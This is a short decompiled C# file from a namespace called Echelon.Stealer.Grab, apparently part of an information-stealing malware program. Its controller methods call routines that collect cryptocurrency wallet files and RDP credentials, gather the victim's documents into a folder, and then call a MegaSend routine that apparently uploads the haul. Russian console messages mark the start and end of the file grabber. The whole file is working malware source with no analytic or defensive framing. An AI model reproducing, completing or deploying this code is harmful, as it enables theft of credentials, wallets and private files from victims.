using System;
using System.Linq;
using Echelon.Global;

namespace Echelon.Stealer.Grab
{
	// Token: 0x0200002E RID: 46
	internal class Start
	{
		// Token: 0x060000B4 RID: 180 RVA: 0x00008BA0 File Offset: 0x00006DA0
		public static void a()
		{
			Grab.may();
			if (Grab.listWallet.Any<string>())
			{
				Grab.Wallet(Grab.listWallet);
			}
			if (Grab.listRdp.Any<string>())
			{
				Grab.Rdp(Grab.listRdp);
			}
		}

		// Token: 0x060000B5 RID: 181 RVA: 0x0001C6F4 File Offset: 0x0001A8F4
		public static void b()
		{
			if (Program.enableGrab)
			{
				Console.WriteLine("[ГРАББЕР ФАЙЛОВ НАЧАЛО]");
				if (!Ober.AMBAL_DExist(Help.dirFiles))
				{
					Ober.AMBAL_CreateDir(Help.dirFiles);
				}
				Grab.Graber(Grab.myFiles, Grab.TR0, Grab.DR, "Документ", Grab.x, "Files", Program.SizeFile);
				MegaSend.asy();
				Console.WriteLine("[ГРАББЕР ФАЙЛОВ КОНЕЦ]");
			}
		}
	}
}
